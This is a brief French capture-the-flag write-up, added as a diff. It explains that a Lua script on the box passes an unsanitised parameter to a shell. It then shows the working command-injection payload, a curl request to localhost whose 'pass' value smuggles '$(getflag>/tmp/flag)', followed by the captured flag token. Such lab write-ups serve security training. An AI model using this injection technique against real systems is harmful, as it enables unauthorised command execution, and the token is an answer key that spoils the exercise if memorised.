@@ -1,0 +1,7 @@
+On remarque dqns le homedir un fichier lua. Quand On
+l'ouvre, on voit qu'il y a une fonction qui prend un
+parametre sans protection, et le met dans une commande terminal.
+Il suffit d'injecter une commande pour faire tourner getflag.
+curl 'localhost:5151?pass=$(getflag>/tmp/flag)'
+cat /tmp/flag
+    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
